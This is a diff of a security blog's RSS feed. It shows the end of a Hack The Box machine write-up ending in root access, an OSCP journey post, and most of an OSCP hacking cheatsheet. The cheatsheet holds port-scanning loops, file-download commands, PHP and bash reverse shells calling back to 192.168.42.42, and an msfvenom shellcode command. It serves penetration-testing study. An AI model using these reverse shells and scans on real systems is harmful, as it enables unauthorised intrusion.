+    passwordFile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(p) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> passwords]) 
+    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
         f<span style="color:#f92672">.</span>write(passwordFile)
     time<span style="color:#f92672">.</span>sleep(<span style="color:#f92672">.</span><span style="color:#ae81ff">1</span>)
-    salt <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
-    realPass <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+    salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    realPass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
     <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> passwords:
-        <span style="color:#66d9ef">if</span> p[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> session[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">user</span><span style="color:#e6db74">&#39;</span>]:
-            salt, realPass <span style="color:#f92672">=</span> p[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">$</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">2</span>:]
+        <span style="color:#66d9ef">if</span> p[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> session[<span style="color:#e6db74">&#39;user&#39;</span>]:
+            salt, realPass <span style="color:#f92672">=</span> p[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;$&#39;</span>)[<span style="color:#ae81ff">2</span>:]
             <span style="color:#66d9ef">break</span>
 
-    <span style="color:#66d9ef">if</span> salt <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Invalid user</span><span style="color:#e6db74">&#34;</span>)
-        os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/tmp/SSH/</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>path)
+    <span style="color:#66d9ef">if</span> salt <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Invalid user&#34;</span>)
+        os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path)
         sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
-    salt <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">$6$</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>salt<span style="color:#f92672">+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">$</span><span style="color:#e6db74">&#39;</span>
+    salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$6$&#39;</span><span style="color:#f92672">+</span>salt<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;$&#39;</span>
     realPass <span style="color:#f92672">=</span> salt <span style="color:#f92672">+</span> realPass
 
     hash <span style="color:#f92672">=</span> crypt<span style="color:#f92672">.</span>crypt(passW, salt)
 
     <span style="color:#66d9ef">if</span> hash <span style="color:#f92672">==</span> realPass:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Authed!</span><span style="color:#e6db74">&#34;</span>)
-        session[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">authenticated</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Authed!&#34;</span>)
+        session[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
     <span style="color:#66d9ef">else</span>:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Incorrect pass</span><span style="color:#e6db74">&#34;</span>)
-        os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/tmp/SSH/</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>path)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Incorrect pass&#34;</span>)
+        os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path)
         sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
-    os<span style="color:#f92672">.</span>remove(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/tmp/SSH/</span><span style="color:#e6db74">&#39;</span>,path))
+    os<span style="color:#f92672">.</span>remove(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span>,path))
 <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
     traceback<span style="color:#f92672">.</span>print_exc()
     sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
 
-<span style="color:#66d9ef">if</span> session[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">authenticated</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+<span style="color:#66d9ef">if</span> session[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
     <span style="color:#66d9ef">while</span> True:
-        command <span style="color:#f92672">=</span> input(session[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">user</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">@Obscure$ </span><span style="color:#e6db74">&#34;</span>)
-        cmd <span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">sudo</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-u</span><span style="color:#e6db74">&#39;</span>,  session[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">user</span><span style="color:#e6db74">&#39;</span>]]
-        cmd<span style="color:#f92672">.</span>extend(command<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#34;</span>))
+        command <span style="color:#f92672">=</span> input(session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@Obscure$ &#34;</span>)
+        cmd <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;sudo&#39;</span>, <span style="color:#e6db74">&#39;-u&#39;</span>,  session[<span style="color:#e6db74">&#39;user&#39;</span>]]
+        cmd<span style="color:#f92672">.</span>extend(command<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>))
         proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen(cmd, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
 
         o,e <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>communicate()
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Output: </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> o<span style="color:#f92672">.</span>decode(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ascii</span><span style="color:#e6db74">&#39;</span>))
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Error: </span><span style="color:#e6db74">&#39;</span>  <span style="color:#f92672">+</span> e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ascii</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#66d9ef">if</span> len(e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ascii</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Output: &#39;</span> <span style="color:#f92672">+</span> o<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>))
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Error: &#39;</span>  <span style="color:#f92672">+</span> e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#66d9ef">if</span> len(e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span>)
 </code></pre></div><p>On top of this we see that we can run with sudo (tl;dr: as root user) the mentioned script:</p>
 <pre><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo -l
 Matching Defaults entries for robert on obscure:
@@ -822,18 +796,8 @@ root@obscure:~# id
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre><p>Well, this was a really fun machine, and one that teach me a lot (specifically talking python stuff), so well I hope I can give something yousefull to you with this write up, and thanks a lot for read until the end :)</p>
 <p>I will try to be making some time to do write ups of some other machines, until next time!!</p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>A Journey in the Dark - An adventure&#39;s tale towards OSCP</title>
-            <link>https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/</link>
-            <pubDate>Mon, 27 Apr 2020 00:00:00 +0000</pubDate>
-            
-            <guid>https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/</guid>
-            <description>Preface This is the story of how I got my OSCP coming from a background as Linux Sysadmin/DevOps as also which ones are my plans for the future.
-Every tale where there is an adventurer, starts with him (the adventurer) and his friends, these who share the journey providing support and advice through it, as the story moves forward, new characters tend to appear, joining the adventurer in his travel.</description>
-            <content type="html"><![CDATA[
+]]></content></item><item><title>A Journey in the Dark - An adventure's tale towards OSCP</title><link>https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/</link><pubDate>Mon, 27 Apr 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/</guid><description>Preface This is the story of how I got my OSCP coming from a background as Linux Sysadmin/DevOps as also which ones are my plans for the future.
+Every tale where there is an adventurer, starts with him (the adventurer) and his friends, these who share the journey providing support and advice through it, as the story moves forward, new characters tend to appear, joining the adventurer in his travel.</description><content type="html"><![CDATA[
     <img src="/images/blog/oscp/oscp_banner.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -945,18 +909,8 @@ Don&rsquo;t think of &ldquo;Try Harder&rdquo; as you need to exprime more your b
 Take rests, eat, be aware what you are lacking on your documentation and what is excessing, learn to be self-aware of your weakness (mind SQLI and Windows).</p>
 <p><strong>But again most important: Keep trying harder!!</strong></p>
 <p><em>Note: Please let me know any fix needed on the text or whatever, it also helps to keep improving my english :P</em></p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>Hacking/OSCP cheatsheet</title>
-            <link>https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</link>
-            <pubDate>Tue, 07 Apr 2020 02:30:30 +0000</pubDate>
-            
-            <guid>https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</guid>
-            <description>Hacking/OSCP Cheatsheet Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff. But this is basically the tools I tend to relie and use in this way the most. Hope is helpfull for you!
-Enumeration Network discoverie Nmap I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:</description>
-            <content type="html"><![CDATA[<h1 id="hackingoscp-cheatsheet">Hacking/OSCP Cheatsheet</h1>
+]]></content></item><item><title>Hacking/OSCP cheatsheet</title><link>https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</link><pubDate>Tue, 07 Apr 2020 02:30:30 +0000</pubDate><guid>https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</guid><description>Hacking/OSCP Cheatsheet Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff. But this is basically the tools I tend to relie and use in this way the most. Hope is helpfull for you!
+Enumeration Network discoverie Nmap I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:</description><content type="html"><![CDATA[<h1 id="hackingoscp-cheatsheet">Hacking/OSCP Cheatsheet</h1>
 <p>Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff.
 But this is basically the tools I tend to relie and use in this way the most.
 Hope is helpfull for you!</p>
@@ -983,17 +937,17 @@ nmap -sU -p- -oA nmap/udp &lt;ip or cidr&gt;
 </code></pre><h3 id="ports-discovery-without-nmap">Ports discovery (without nmap)</h3>
 <h4 id="nc--bash">nc + bash</h4>
 <p>If you get in a machine that doesn&rsquo;t have nmap installed, you can do a basic discovery of (for example), top 10 ports open in 192.168.30 by doing:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">top10<span style="color:#f92672">=</span><span style="color:#f92672">(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span> nc -w <span style="color:#ae81ff">1</span> 192.168.30.253 $i <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Port </span>$i<span style="color:#e6db74"> is open</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Port </span>$i<span style="color:#e6db74"> is closed or filtered</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">done</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">top10<span style="color:#f92672">=(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span> nc -w <span style="color:#ae81ff">1</span> 192.168.30.253 $i <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is open&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is closed or filtered&#34;</span>; <span style="color:#66d9ef">done</span>
 </code></pre></div><h4 id="devtcpipport-or-devudpipport">/dev/tcp/ip/port or /dev/udp/ip/port</h4>
 <p>Alternatively, is possible to do the same than above but by using the special dev files <code>/dev/tcp/ip/port</code> or <code>/dev/udp/ip/port</code> (for example nc is not found):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">top10<span style="color:#f92672">=</span><span style="color:#f92672">(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span> <span style="color:#f92672">(</span>echo &gt; /dev/tcp/192.168.30.253/<span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Port </span>$i<span style="color:#e6db74"> is open</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Port </span>$i<span style="color:#e6db74"> is closed</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">done</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">top10<span style="color:#f92672">=(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span> <span style="color:#f92672">(</span>echo &gt; /dev/tcp/192.168.30.253/<span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is open&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is closed&#34;</span>; <span style="color:#66d9ef">done</span>
 </code></pre></div><p>Taking these last  examples, is straightforward to create a dummy script for scan a hole /24 net (for example):</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
 </span><span style="color:#75715e"></span>subnet<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.30&#34;</span>
-top10<span style="color:#f92672">=</span><span style="color:#f92672">(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>
+top10<span style="color:#f92672">=(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>
 <span style="color:#66d9ef">for</span> host in <span style="color:#f92672">{</span>1..255<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
     <span style="color:#66d9ef">for</span> port in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span>
-        <span style="color:#f92672">(</span>echo &gt; /dev/tcp/<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Host </span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74"> has </span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74"> open</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Host </span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74"> has </span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74"> closed</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#f92672">(</span>echo &gt; /dev/tcp/<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Host </span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74"> has </span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74"> open&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;Host </span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74"> has </span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74"> closed&#34;</span>
     <span style="color:#66d9ef">done</span>
 <span style="color:#66d9ef">done</span>
 </code></pre></div><h3 id="banner-grabbing-without-nmap">Banner grabbing (without nmap)</h3>
@@ -1080,7 +1034,7 @@ IWR -Uri &quot;http://192.168.42.42/n64.exe&quot; -Outfile &quot;n64.exe&quot;
 </code></pre><h4 id="linux">Linux</h4>
 <pre><code class="language-console" data-lang="console">curl http://192.168.42.42/evil.php --output evil.php
 </code></pre><h3 id="ftp">FTP</h3>
-<p>If there is an ftp server which we have access, we can upload files there through it, the &quot;&rdquo; is the same for both, windows or linux:</p>
+<p>If there is an ftp server which we have access, we can upload files there through it, the &quot;&quot; is the same for both, windows or linux:</p>
 <pre><code class="language-console" data-lang="console">Connect and login with:
 
 ftp 192.168.42.42
@@ -1136,8 +1090,8 @@ Later on is possible to connect from the local machine:
 ssh foo@192.168.25.74
 </code></pre><h2 id="reverse-shells">Reverse shells</h2>
 <h3 id="php">php</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> $sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>(<span style="color:#e6db74">&#34;192.168.42.42&#34;</span>,<span style="color:#e6db74">&#34;443&#34;</span>); $proc <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>(<span style="color:#e6db74">&#34;/bin/sh -i&#34;</span>, <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">0</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">1</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">2</span><span style="color:#f92672">=&gt;</span>$sock), $pipes); <span style="color:#75715e">?&gt;</span>
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">php -r &#39;$sock=fsockopen(&#34;192.168.42.42&#34;,443);exec(&#34;/bin/sh -i <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#960050;background-color:#1e0010">&amp;</span>3 &gt;<span style="color:#960050;background-color:#1e0010">&amp;</span>3 2&gt;&amp;3&#34;);&#39;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> $sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>(<span style="color:#e6db74">&#34;192.168.42.42&#34;</span>,<span style="color:#e6db74">&#34;443&#34;</span>); $proc <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>(<span style="color:#e6db74">&#34;/bin/sh -i&#34;</span>, <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">0</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">1</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">2</span><span style="color:#f92672">=&gt;</span>$sock), $pipes); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">r</span> <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;192.168.42.42&#34;,443);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
 </code></pre></div><h3 id="bash">bash</h3>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/192.168.42.42/443 0&gt;&amp;<span style="color:#ae81ff">1</span>
 </code></pre></div><h3 id="sh--nc">sh + nc</h3>
@@ -1280,18 +1234,8 @@ EOF
 /usr/bin/msfvenom
 </code></pre><h3 id="shellcode-poc-calcexe">Shellcode POC: calc.exe</h3>
 <pre><code class="language-console" data-lang="console">msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name buffer CMD=calc.exe EXITFUNC=thread
-</code></pre>]]></content>
-        </item>
-        
-        <item>
-            <title>Hack The Box - AI</title>
-            <link>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</link>
-            <pubDate>Fri, 07 Feb 2020 00:00:00 +0000</pubDate>
-            
-            <guid>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</guid>
-            <description>Quick Summary Finally, I&amp;rsquo;m posting the walk-through of this box, currently, I&amp;rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D. At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.
-This was a box where for the foothold, you needed to upload a .</description>
-            <content type="html"><![CDATA[
